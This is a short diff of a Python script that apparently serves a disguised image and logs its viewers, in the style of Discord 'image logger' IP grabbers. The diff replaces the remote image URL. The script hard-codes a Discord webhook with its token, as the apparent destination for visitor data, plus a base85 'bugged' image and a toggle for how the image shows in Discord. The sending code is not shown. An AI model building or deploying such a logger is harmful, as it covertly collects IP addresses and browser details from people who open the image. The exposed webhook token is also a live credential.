@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1474881447432290304/Wdqbf2dbTxKfISZrr9lYNDPyCAZAYWDmVKoSTzOh8GJ_w6i1BkVtQv6JfC7ThAViok6d'
 
-bindata = httpx.get('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExcnF3anBtaTgybWU2eDBsODk3b2MzZWR6bmc2MnFydXdzY2Q0Zm9uNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/HT242oEcxM07Qn7A58/giphy.gif').content
+bindata = httpx.get('https://m.media-amazon.com/images/I/B1pppR4gVKL._CLa%7C2140%2C2000%7C91pQiTI7IjL.png%7C0%2C0%2C2140%2C2000%2B0.0%2C0.0%2C2140.0%2C2000.0_AC_SX679_.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
